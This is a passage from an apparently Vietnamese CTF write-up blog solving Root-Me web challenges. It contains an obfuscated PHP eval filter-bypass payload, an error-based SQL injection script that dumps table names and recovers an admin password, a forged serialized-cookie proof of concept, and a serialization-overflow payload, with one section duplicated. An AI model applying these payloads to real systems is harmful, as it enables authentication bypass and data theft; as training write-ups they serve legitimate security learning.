++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__; 
$_____.=$__;
$__=$_;
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__; 
$_____.=$__;
$__=$_;
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;
$_____.=$__;
$__=$_;
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__; 
$_____.=$__;
$__=$_;
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__; 
$_____.=$__;
$__=$_;
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__; 
$_____.=$__;
$__=$_;
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__; 
$_____.=$__;
$__=$_;
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__; 
$_____.=$__;
$__=$_;
++$__;++$__;++$__;++$__; 
$_____.=$__;
$__=$_;
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__; 
$_____.=$__;
$__=$_;

$____='';
++$__;++$__;
$____.=$__;
$__=$_;
$____.=$__;
$__=$_;
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__; 
$____.=$__;
$__=$_;

$______='.';
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__; 
$______.=$__;
$__=$_;
$______.=$__;
$__=$_;
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__; 
$______.=$__;
$______.=$__;
$__=$_;
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__; 
$______.=$__;
$__=$_;
++$__;++$__;++$__;
$______.=$__;
$__=$_;
$__________ = $____.&quot; &quot;.$______ ;
$___($_____($__________ ))
</code></pre><p><img src="https://hackmd.io/_uploads/rJKWLpgWkx.png" alt="image"></p>
<p>flag: <code>M!xIng_PHP_w1th_3v4l_L0L</code></p>
<h2 id="php---eval---advanced-filters-bypass">PHP - Eval - Advanced filters bypass</h2>
<h2 id="java---spring-boot">Java - Spring Boot</h2>
<p><img src="https://hackmd.io/_uploads/HJgsJE-bke.png" alt="image"></p>
<h2 id="sql-injection---error">SQL injection - Error</h2>
<p>Như đề bài -&gt; khi ta vào trang web có 2 page là login và contents thử fuzz chức năng login có vẻ không có sqli được -&gt; chuyển hướng qua pages contents</p>
<p><img src="https://hackmd.io/_uploads/BkbyofbZJg.png" alt="image"></p>
<p>sau khi thử 2 param thì order có sinh ra lỗi -&gt; có vẻ sink nằm ở đây
-&gt; dùng cast as int với string để sql trả ra error</p>
<pre><code>import requests
import re

session = requests.Session()

# URL mẫu với format string cho OFFSET
base_url = &quot;http://challenge01.root-me.org:80/web-serveur/ch34/?action=contents&amp;order=asc, CAST((select table_name from information_schema.tables limit 1 OFFSET {offset}) AS int)--&quot;
cookies = {&quot;PHPSESSID&quot;: &quot;15ad3f4448ad899ad5edab914068910a&quot;}

# Lặp qua offset từ 1 đến 70
for offset in range(0, 71):
    url = base_url.format(offset=offset)
    headers = {
        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0&quot;,
        &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8&quot;,
        &quot;Accept-Language&quot;: &quot;en-US,en;q=0.5&quot;,
        &quot;Accept-Encoding&quot;: &quot;gzip, deflate, br&quot;,
        &quot;Connection&quot;: &quot;close&quot;,
        &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;,
        &quot;Priority&quot;: &quot;u=0, i&quot;
    }

    response = session.get(url, headers=headers, cookies=cookies)

    # Sử dụng regex để tìm tên bảng trong nội dung trả về
    match = re.search(r'invalid input syntax for integer: &quot;([^&quot;]+)&quot;', response.text)

    if match:
        table_name = match.group(1)  # Lấy tên bảng từ kết quả match
        print(f&quot;Offset {offset}: Table name - {table_name}&quot;)
    else:
        print(f&quot;Offset {offset}: No table name found&quot;)

</code></pre><p><img src="https://hackmd.io/_uploads/BJ2sCGZWkx.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/rkxnRMWZ1g.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/H1Zeg7ZZye.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/B1nWemZWkl.png" alt="image"></p>
<p>username: admin
password: 1a2BdKT5DIx3qxQN3UaC</p>
<p><img src="https://hackmd.io/_uploads/HyGNgXWZke.png" alt="image"></p>
<p>flag: <code>1a2BdKT5DIx3qxQN3UaC</code></p>
<h2 id="sql-injection---insert">SQL injection - Insert</h2>
<h2 id="php---serializationphp">PHP - SerializationPHP</h2>
<ul>
<li>Đây là một bài serialize đơn giản với PHP. Có source như sau:</li>
</ul>
<pre><code>
&lt;?php
define('INCLUDEOK', true);
session_start();

if(isset($_GET['showsource'])){
    show_source(__FILE__);
    die;
}

/******** AUTHENTICATION *******/
// login / passwords in a PHP array (sha256 for passwords) !
require_once('./passwd.inc.php');


if(!isset($_SESSION['login']) || !$_SESSION['login']) {
    $_SESSION['login'] = &quot;&quot;;
    // form posted ?
    if($_POST['login'] &amp;&amp; $_POST['password']){
        $data['login'] = $_POST['login'];
        $data['password'] = hash('sha256', $_POST['password']);
    }
    // autologin cookie ?
    else if($_COOKIE['autologin']){
        $data = unserialize($_COOKIE['autologin']);
        $autologin = &quot;autologin&quot;;
    }

    // check password !
    if ($data['password'] == $auth[ $data['login'] ] ) {
        $_SESSION['login'] = $data['login'];

        // set cookie for autologin if requested
        if($_POST['autologin'] === &quot;1&quot;){
            setcookie('autologin', serialize($data));
        }
    }
    else {
        // error message
        $message = &quot;Error : $autologin authentication failed !&quot;;
    }
}
/*********************************/
?&gt;



&lt;html&gt;
&lt;head&gt;
&lt;style&gt;
label {
    display: inline-block;
    width:150px;
    text-align:right;
}
input[type='password'], input[type='text'] {
    width: 120px;
}
&lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;h1&gt;Restricted Access&lt;/h1&gt;

&lt;?php

// message ?
if(!empty($message))
    echo &quot;&lt;p&gt;&lt;em&gt;$message&lt;/em&gt;&lt;/p&gt;&quot;;

// admin ?
if($_SESSION['login'] === &quot;superadmin&quot;){
    require_once('admin.inc.php');
}
// user ?
elseif (isset($_SESSION['login']) &amp;&amp; $_SESSION['login'] !== &quot;&quot;){
    require_once('user.inc.php');
}
// not authenticated ? 
else {
?&gt;
&lt;p&gt;Demo mode with guest / guest !&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;superadmin says :&lt;/strong&gt; New authentication mechanism without any database. &lt;a href=&quot;index.php?showsource&quot;&gt;Our source code is available here.&lt;/a&gt;&lt;/p&gt;

&lt;form name=&quot;authentification&quot; action=&quot;index.php&quot; method=&quot;post&quot;&gt;
&lt;fieldset style=&quot;width:400px;&quot;&gt;
&lt;p&gt;
    &lt;label&gt;Login :&lt;/label&gt;
    &lt;input type=&quot;text&quot; name=&quot;login&quot; value=&quot;&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;
    &lt;label&gt;Password :&lt;/label&gt;
    &lt;input type=&quot;password&quot; name=&quot;password&quot; value=&quot;&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;
    &lt;label&gt;Autologin next time :&lt;/label&gt;
    &lt;input type=&quot;checkbox&quot; name=&quot;autologin&quot; value=&quot;1&quot; /&gt;
&lt;/p&gt;
&lt;p style=&quot;text-align:center;&quot;&gt;
    &lt;input type=&quot;submit&quot; value=&quot;Authenticate&quot; /&gt;
&lt;/p&gt;
&lt;/fieldset&gt;
&lt;/form&gt;
&lt;?php
}

if(isset($_SESSION['login']) &amp;&amp; $_SESSION['login'] !== &quot;&quot;){
    echo &quot;&lt;p&gt;&lt;a href='disconnect.php'&gt;Disconnect&lt;/a&gt;&lt;/p&gt;&quot;;
}
?&gt;
&lt;/body&gt;
&lt;/html&gt;

</code></pre><ul>
<li>
<p>Như ta có thể thấy là trang web chưa chức năng login, logout và rememmber user.</p>
</li>
<li>
<p>Đầu tiên quan sát nơi có thể sẽ chưa flag đó là:</p>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/rkxO59K6a.png" alt="image"></p>
</li>
<li>
<p>Nếu mà người dùng đăng nhập với tài khoản admin tương được với _SESSION người dùng là <code>superadmin</code> thì bài toán được sol :&gt;</p>
</li>
<li>
<p>Chức năng nhập kết hợp với chức năng rememmber account!!!</p>
</li>
</ul>
<pre><code>require_once('./passwd.inc.php');


if(!isset($_SESSION['login']) || !$_SESSION['login']) {
    $_SESSION['login'] = &quot;&quot;;
    // form posted ?
    if($_POST['login'] &amp;&amp; $_POST['password']){
        $data['login'] = $_POST['login'];
        $data['password'] = hash('sha256', $_POST['password']);
    }
    // autologin cookie ?
    else if($_COOKIE['autologin']){
        $data = unserialize($_COOKIE['autologin']);
        $autologin = &quot;autologin&quot;;
    }

    // check password !
    if ($data['password'] == $auth[ $data['login'] ] ) {
        $_SESSION['login'] = $data['login'];

        // set cookie for autologin if requested
        if($_POST['autologin'] === &quot;1&quot;){
            setcookie('autologin', serialize($data));
        }
    }
    else {
        // error message
        $message = &quot;Error : $autologin authentication failed !&quot;;
    }
}
/*********************************/
?&gt;

</code></pre><ul>
<li>
<p>Như ta có thể thấy là khi mà login thì sẽ nhận username và passwd được sha256 encode nếu mà tồn tại <code>$_COOKIE['autologin']</code> thì sẽ serialize <code>$_COOKIE['autologin']</code> và đăng nhập với tài khoản đó mà không check gì luôn:&lt;</p>
</li>
<li>
<p>Sơ qua có thể thấy ta sẽ đấm vào chỗ không check :3</p>
</li>
<li>
<p>Vấn đề đầu tiên là <code>($data['password'] == $auth[ $data['login'])</code> có thể nhận thấy lỗ hổng losecompare ở đây thì mình set <code>password = true</code> để bypass với type jugging.</p>
</li>
<li>
<p>Vấn đề thứ 2 là để <code>$_SESSION['login'] === &quot;superadmin&quot;</code> thì <code>$_SESSION['login'] = $data['login'];</code> vì vậy cho nên cho userame = &lsquo;superadmin&rsquo; là bypass.</p>
</li>
</ul>
<h3 id="poc">POC</h3>
<pre><code>&lt;?php

$string = &quot;a%3A2%3A%7Bs%3A5%3A%22login%22%3Bs%3A5%3A%22guest%22%3Bs%3A8%3A%22password%22%3Bs%3A64%3A%2284983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec%22%3B%7D&quot;;
$string = urldecode($string);
$a = unserialize($string);
var_dump($a);

$data['login'] = 'superadmin';
$data['password'] = true;

echo (urlencode(serialize($data)));
?&gt;

</code></pre><ul>
<li>
<p><img src="https://hackmd.io/_uploads/rkuMcqF6T.png" alt="image"></p>
</li>
<li>
<ul>
<li>Và đã thành công:</li>
</ul>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/SkzJccYpa.png" alt="image"></p>
</li>
</ul>
<p>Flag <code>NoUserInputInPHPSerialization!</code></p>
<h2 id="deserialization-overflow">Deserialization Overflow</h2>
<pre><code>&lt;?php
include 'flag.php';

ini_set('display_errors', 1);
error_reporting(E_ALL);

class User
{
    protected $_username;
    protected $_password;
    protected $_logged = false;
    protected $_email = '';

    public function __construct($username, $password)
    {
        $this-&gt;_username = $username;
        $this-&gt;_password = $password;
        $this-&gt;_logged = false;
    }

    public function setLogged($logged)
    {
        $this-&gt;_logged = $logged;
    }

    public function isLogged()
    {
        return $this-&gt;_logged;
    }

    public function getUsername()
    {
        return $this-&gt;_username;
    }

    public function getPassword()
    {
        return $this-&gt;_password;
    }
}

function storeUserSession($user)
{
    $serialized_value = serialize($user);
    // avoid the storage of null byte, replace it with \0 just in case some session storage don't support it
    // this is done because protected object are prefixed by \x00\x2a\x00 in php serialisation
    $data = str_replace(chr(0) . '*' . chr(0), '\0\0\0', $serialized_value);
    $_SESSION['user'] = $data;
}

function getUserSession()
{
    $user = null;
    if (isset($_SESSION['user'])) {
        $data = $_SESSION['user'];
        $serialized_user = str_replace('\0\0\0', chr(0) . '*' . chr(0), $data);
        $user = unserialize($serialized_user);
    } else {
        $user = new User('guest', '');
    }
    return $user;
}

session_start();
$errorMsg = &quot;&quot;;
$currentUser = null;

// keep entered values :
if (isset($_POST['submit'])) {
    $currentUser = new User($_POST['username'], $_POST['password']);
    $isLogged = $currentUser-&gt;getUsername() === 'admin' &amp;&amp; 
        hash('sha512',$currentUser-&gt;getPassword()) === 'b3b7b663909f8e9b4e2a581337159e8a5e468c088ec802cb99a027c1dcbefb7d617fcab66ab4402d4617cde33f7fce93ae3c4e8f77aec2bb5f8c7c8aec3bbc82'; // don't try to bruteforce me this is useless
    $currentUser-&gt;setLogged($isLogged);
    $errorMsg = ($isLogged) ? '' : 'Invalid username or password.';
    storeUserSession($currentUser);
} else {
    $currentUser = getUserSession();
}

if ($currentUser-&gt;isLogged()) {
    echo 'you are logged in! congratz, the flag is: ' . $FLAG;
    die();
}

if (isset($_GET['source'])) {
    show_source(__FILE__);
    die();
}
?&gt;
</code></pre><ul>
<li>Đầu tiên quan sát cách để có được flag đó là _isLogged phải set thành true.</li>
</ul>
<pre><code>if ($currentUser-&gt;isLogged()) {
    echo 'you are logged in! congratz, the flag is: ' . $FLAG;
    die();
}
</code></pre><ul>
<li>
<p>Trang web có chức năng đăng nhập sau khi submit sẽ khởi tạo <code> $currentUser = new User($_POST['username'], $_POST['password']);</code> sau đó gán isLogged = true nếu username của <code>currentUser</code> === &lsquo;admin&rsquo; và hash(&lsquo;sha512&rsquo;, password) === &lsquo;b3b7b663909f8e9b4e2a581337159e8a5e468c088ec802cb99a027c1dcbefb7d617fcab66ab4402d4617cde33f7fce93ae3c4e8f77aec2bb5f8c7c8aec3bbc82&rsquo;</p>
</li>
<li>
<p>Cuối cùng gọi hàm <code>storeUserSession</code> tiến hành <code>serialize</code> <code>$currentUser</code> sau đó thực hiện thay thế <code>(chr(0) . '*' . chr(0)</code> bằng <code>\0\0\0</code> trong thông tin vừa dược serialize</p>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/rk9qFqt06.png" alt="image"></p>
</li>
<li>
<p>Mình giải thích thêm ở đây là những thuộc tính là protected thì sau khi serialize thì sẽ có dấu <code>*</code> đứng trước nó</p>
</li>
</ul>
<pre><code>&lt;?php
    class Person {
        public $name = &quot;Tom&quot;;
        private $age = 18;
        protected $sex = &quot;male&quot;;
        public function hello() {
            echo &quot;hello&quot;;
        }
    }
    $example = new Person();
    $example_ser = serialize($example);
    echo $example_ser;
-- sau khi thực hiện kết quả sẽ là 
O:6:&quot;Person&quot;:3:{s:4:&quot;name&quot;;s:3:&quot;Tom&quot;;s:11:&quot;Personage&quot;;i:18;s:6:&quot;*sex&quot;;s:4:&quot;male&quot;;}
</code></pre><ul>
<li>
<p><img src="https://hackmd.io/_uploads/SJkE59K0p.png" alt="image"></p>
</li>
<li>
<p>oke bây giờ thì còn hàm  :-1:</p>
</li>
</ul>
<p><code>function getUserSession() { $user = null; if (isset($_SESSION['user'])) { $data = $_SESSION['user']; $serialized_user = str_replace('\0\0\0', chr(0) . '*' . chr(0), $data); $user = unserialize($serialized_user); } else { $user = new User('guest', ''); } return $user; }</code></p>
<ul>
<li>
<p>hàm này sẽ lấy session và lấy ra giá trị username sau đó thực hiện thay thế ngược lại giá trị <code>\0\0\0</code> bằng <code>(chr(0) . '*' . chr(0)</code> và thực hiện unserialize</p>
</li>
<li>
<p>Vậy có thể hiểu được sink của cuộc tấn công nằm ở này.</p>
</li>
<li>
<p>Nhưng mà ta khó có thể control được đầu vào của isLogged, bơi vì password đã được hash với <code>sha512</code> :(</p>
</li>
<li>
<p>Stuck ở chỗ này khá lâu, thì mình để ý đoạn này tại sao server lại replace_all <code>null*null</code> bằng <code>\0\0\0</code> và tên chall là over-flow:&gt;</p>
</li>
<li>
<p>Over-flow : mô tả tình trạng khi một hệ thống hoặc nguồn tài nguyên không thể xử lý hoặc chứa các dữ liệu hoặc giá trị lớn hơn giới hạn được quy định.</p>
</li>
<li>
<p>Vậy nên ta lợi dụng việc khi lưu sessionUser thì sau khi lưu lần đầu số byte của nó tăng 3 bytes từ <code>*</code> sang <code>\0\0\0</code> vậy nên đối với $currentUser có 4 phần từ protected nên sau khi thay thế sẽ tăng 12 bytes. Sau khi unserialize nó mới trở lại ban đầu.</p>
</li>
<li>
<blockquote>
<blockquote>
<p>Ta chèn <code>\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0</code> vào <code>username</code> và password vào <code>&quot;%3b&quot;%3bs%3a12%3a&quot;%00%00_password&quot;%3bs%3a3%3a&quot;123&quot;%3bs%3a10%3a&quot;%00%00_logged&quot;%3bb%3a1%3bs%3a9%3a&quot;%00*%00_email&quot;%3bs%3a44%3a</code> khi đó thì quá trình getSessionUser</p>
</blockquote>
</blockquote>
</li>
<li>
<p>Luồng xử lí như sau:</p>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/HkdIk2KRT.png" alt="image"></p>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/r1o_12K0p.png" alt="image"></p>
</li>
<li>
<p>Lúc này session đã được lưu lại.</p>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/rypxx3YR6.png" alt="image"></p>
</li>
<li>
<p>GET / sẽ thực hiện gọi hàm <code>getUserSession</code> và thực hiện thay thế &ldquo;\0\0\0&rdquo; thành <code>null*null</code> deserialize ta sẽ ghi đè được isLogged là <code>true</code>.</p>
</li>
<li>
<p>Kết quả em nhận được sau khi deserial ở hàm getSessionUser là:</p>
</li>
</ul>
<pre><code>object(User)#2 (4) {   
[&quot;_username&quot;:protected]=&gt;   string(60) &quot;**********&quot;;s:12:&quot;*_password&quot;;s:77:&quot;&quot;;&quot;   
[&quot;_password&quot;:protected]=&gt;   string(3) &quot;123&quot;   
[&quot;_logged&quot;:protected]=&gt;   bool(true)   
[&quot;_email&quot;:protected]=&gt;   string(44) &quot;;s:10:&quot;

</code></pre><p><img src="https://hackmd.io/_uploads/S1GnXe5C6.png" alt="image"></p>
<h2 id="deserialization-overflow-1">Deserialization Overflow</h2>
<pre><code>&lt;?php
include 'flag.php';

ini_set('display_errors', 1);
error_reporting(E_ALL);

class User
{
    protected $_username;
    protected $_password;
    protected $_logged = false;
    protected $_email = '';

    public function __construct($username, $password)
    {
        $this-&gt;_username = $username;
        $this-&gt;_password = $password;
        $this-&gt;_logged = false;
    }

    public function setLogged($logged)
    {
        $this-&gt;_logged = $logged;
    }

    public function isLogged()
    {
        return $this-&gt;_logged;
    }

    public function getUsername()
    {
        return $this-&gt;_username;
    }

    public function getPassword()
    {
        return $this-&gt;_password;
    }
}

function storeUserSession($user)
{
    $serialized_value = serialize($user);
    // avoid the storage of null byte, replace it with \0 just in case some session storage don't support it
    // this is done because protected object are prefixed by \x00\x2a\x00 in php serialisation
    $data = str_replace(chr(0) . '*' . chr(0), '\0\0\0', $serialized_value);
    $_SESSION['user'] = $data;
}

function getUserSession()
{
    $user = null;
    if (isset($_SESSION['user'])) {
        $data = $_SESSION['user'];
        $serialized_user = str_replace('\0\0\0', chr(0) . '*' . chr(0), $data);
        $user = unserialize($serialized_user);
    } else {
        $user = new User('guest', '');
    }
    return $user;
}

session_start();
$errorMsg = &quot;&quot;;
$currentUser = null;

// keep entered values :
if (isset($_POST['submit'])) {
    $currentUser = new User($_POST['username'], $_POST['password']);
    $isLogged = $currentUser-&gt;getUsername() === 'admin' &amp;&amp; 
        hash('sha512',$currentUser-&gt;getPassword()) === 'b3b7b663909f8e9b4e2a581337159e8a5e468c088ec802cb99a027c1dcbefb7d617fcab66ab4402d4617cde33f7fce93ae3c4e8f77aec2bb5f8c7c8aec3bbc82'; // don't try to bruteforce me this is useless
    $currentUser-&gt;setLogged($isLogged);
    $errorMsg = ($isLogged) ? '' : 'Invalid username or password.';
    storeUserSession($currentUser);
} else {
    $currentUser = getUserSession();
}

if ($currentUser-&gt;isLogged()) {
    echo 'you are logged in! congratz, the flag is: ' . $FLAG;
    die();
}

if (isset($_GET['source'])) {
    show_source(__FILE__);
    die();
}
?&gt;
</code></pre><ul>
<li>Đầu tiên quan sát cách để có được flag đó là _isLogged phải set thành true.</li>
</ul>
<pre><code>if ($currentUser-&gt;isLogged()) {
    echo 'you are logged in! congratz, the flag is: ' . $FLAG;
    die();
}
</code></pre><ul>
<li>
<p>Trang web có chức năng đăng nhập sau khi submit sẽ khởi tạo <code> $currentUser = new User($_POST['username'], $_POST['password']);</code> sau đó gán isLogged = true nếu username của <code>currentUser</code> === &lsquo;admin&rsquo; và hash(&lsquo;sha512&rsquo;, password) === &lsquo;b3b7b663909f8e9b4e2a581337159e8a5e468c088ec802cb99a027c1dcbefb7d617fcab66ab4402d4617cde33f7fce93ae3c4e8f77aec2bb5f8c7c8aec3bbc82&rsquo;</p>
</li>
<li>
<p>Cuối cùng gọi hàm <code>storeUserSession</code> tiến hành <code>serialize</code> <code>$currentUser</code> sau đó thực hiện thay thế <code>(chr(0) . '*' . chr(0)</code> bằng <code>\0\0\0</code> trong thông tin vừa dược serialize</p>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/rk9qFqt06.png" alt="image"></p>
</li>
<li>
<p>Mình giải thích thêm ở đây là những thuộc tính là protected thì sau khi serialize thì sẽ có dấu <code>*</code> đứng trước nó</p>
</li>
</ul>
<pre><code>&lt;?php
    class Person {
        public $name = &quot;Tom&quot;;
        private $age = 18;
        protected $sex = &quot;male&quot;;
        public function hello() {
            echo &quot;hello&quot;;
        }
    }
    $example = new Person();
    $example_ser = serialize($example);
    echo $example_ser;
-- sau khi thực hiện kết quả sẽ là 
O:6:&quot;Person&quot;:3:{s:4:&quot;name&quot;;s:3:&quot;Tom&quot;;s:11:&quot;Personage&quot;;i:18;s:6:&quot;*sex&quot;;s:4:&quot;male&quot;;}
</code></pre><ul>
<li>
<p><img src="https://hackmd.io/_uploads/SJkE59K0p.png" alt="image"></p>
</li>
<li>
<p>oke bây giờ thì còn hàm  :-1:</p>
</li>
</ul>
<p><code>function getUserSession() { $user = null; if (isset($_SESSION['user'])) { $data = $_SESSION['user']; $serialized_user = str_replace('\0\0\0', chr(0) . '*' . chr(0), $data); $user = unserialize($serialized_user); } else { $user = new User('guest', ''); } return $user; }</code></p>
<ul>
<li>
<p>hàm này sẽ lấy session và lấy ra giá trị username sau đó thực hiện thay thế ngược lại giá trị <code>\0\0\0</code> bằng <code>(chr(0) . '*' . chr(0)</code> và thực hiện unserialize</p>
</li>
<li>
<p>Vậy có thể hiểu được sink của cuộc tấn công nằm ở này.</p>
</li>
<li>
<p>Nhưng mà ta khó có thể control được đầu vào của isLogged, bơi vì password đã được hash với <code>sha512</code> :(</p>
</li>
<li>
<p>Stuck ở chỗ này khá lâu, thì mình để ý đoạn này tại sao server lại replace_all <code>null*null</code> bằng <code>\0\0\0</code> và tên chall là over-flow:&gt;</p>
</li>
<li>
<p>Over-flow : mô tả tình trạng khi một hệ thống hoặc nguồn tài nguyên không thể xử lý hoặc chứa các dữ liệu hoặc giá trị lớn hơn giới hạn được quy định.</p>
</li>
<li>
<p>Vậy nên ta lợi dụng việc khi lưu sessionUser thì sau khi lưu lần đầu số byte của nó tăng 3 bytes từ <code>*</code> sang <code>\0\0\0</code> vậy nên đối với $currentUser có 4 phần từ protected nên sau khi thay thế sẽ tăng 12 bytes. Sau khi unserialize nó mới trở lại ban đầu.</p>
</li>
<li>
<blockquote>
<blockquote>
<p>Ta chèn <code>\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0</code> vào <code>username</code> và password vào <code>&quot;%3b&quot;%3bs%3a12%3a&quot;%00%00_password&quot;%3bs%3a3%3a&quot;123&quot;%3bs%3a10%3a&quot;%00%00_logged&quot;%3bb%3a1%3bs%3a9%3a&quot;%00*%00_email&quot;%3bs%3a44%3a</code> khi đó thì quá trình getSessionUser</p>
</blockquote>
</blockquote>
</li>
<li>
<p>Luồng xử lí như sau:</p>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/HkdIk2KRT.png" alt="image"></p>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/r1o_12K0p.png" alt="image"></p>
</li>
<li>
<p>Lúc này session đã được lưu lại.</p>
</li>
<li>
<p><img src="https://hackmd.io/_uploads/rypxx3YR6.png" alt="image"></p>
</li>
<li>
<p>GET / sẽ thực hiện gọi hàm <code>getUserSession</code> và thực hiện thay thế &ldquo;\0\0\0&rdquo; thành <code>null*null</code> deserialize ta sẽ ghi đè được isLogged là <code>true</code>.</p>
</li>
</ul>


        
          <div class="blog-tags">
            
              
              <a href="https://l3mnt2010.github.io/tags/ctf/">CTF</a>&nbsp;
            
              
              <a href="https://l3mnt2010.github.io/tags/vietnamese/">Vietnamese</a>&nbsp;
            
          </div>
        

        

        
      </article>

      
        <ul class="pager blog-pager">
          
            <li class="previous">
              <a href="https://l3mnt2010.github.io/write-up/2024-10-09-svattt-2024-quals/" data-toggle="tooltip" data-placement="top" title="SVATTT 2024 Quals - WEB &#39;s challenges">&larr; Previous Post</a>
            </li>
          
          
            <li class="next">
              <a href="https://l3mnt2010.github.io/write-up/2024-12-10-popcornhtb/" data-toggle="tooltip" data-placement="top" title="PopCorn HTB">Next Post &rarr;</a>
            </li>
          
        </ul>
      


      

    </div>
  </div>
</div>

      <footer>
  <div class="container">
    
    <div class="row">
      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
        <ul class="list-inline text-center footer-links">
          
          
        </ul>
        <p class="credits copyright text-muted">
          

          &nbsp;&bull;&nbsp;&copy;
          
            0001
          

          
            &nbsp;&bull;&nbsp;
            <a href="https://l3mnt2010.github.io/">&gt; root@l3mnt2010:~# ./exploit.py</a>
          
        </p>
        
        <p class="credits theme-by text-muted">
          <a href="https://gohugo.io">Hugo v0.83.1</a> powered &nbsp;&bull;&nbsp; Theme <a href="https://github.com/halogenica/beautifulhugo">Beautiful Hugo</a> adapted from <a href="https://deanattali.com/beautiful-jekyll/">Beautiful Jekyll</a>
          
        </p>
      </div>
    </div>
  </div>
</footer><script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.7/dist/katex.min.js" integrity="sha384-G0zcxDFp5LWZtDuRMnBkk3EphCK1lhEf4UEyEM693ka574TZGwo4IWwS6QLzM/2t" crossorigin="anonymous"></script>
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.7/dist/contrib/auto-render.min.js" integrity="sha384-+VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4+/RRE05" crossorigin="anonymous" onload="renderMathInElement(document.body);"></script>
<script src="https://code.jquery.com/jquery-3.7.0.slim.min.js" integrity="sha384-w5y/xIeYixWvfM+A1cEbmHPURnvyqmVg5eVENruEdDjcyRLUSNej7512JQGspFUr" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@3.4.1/dist/js/bootstrap.min.js" integrity="sha384-aJ21OjlMXNL5UyIl/XNwTMqvzeRMZH2w8c5cRVpzpU8Y5bApTppSuUkhZXN0VxHd" crossorigin="anonymous"></script>

<script src="https://l3mnt2010.github.io/js/main.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.js" integrity="sha384-QELNnmcmU8IR9ZAykt67vGr9/rZJdHbiWi64V88fCPaOohUlHCqUD/unNN0BXSqy" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe-ui-default.min.js" integrity="sha384-m67o7SkQ1ALzKZIFh4CiTA8tmadaujiTa9Vu+nqPSwDOqHrDmxLezTdFln8077+q" crossorigin="anonymous"></script><script src="https://l3mnt2010.github.io/js/load-photoswipe.js"></script>










    
  </body>
</html>

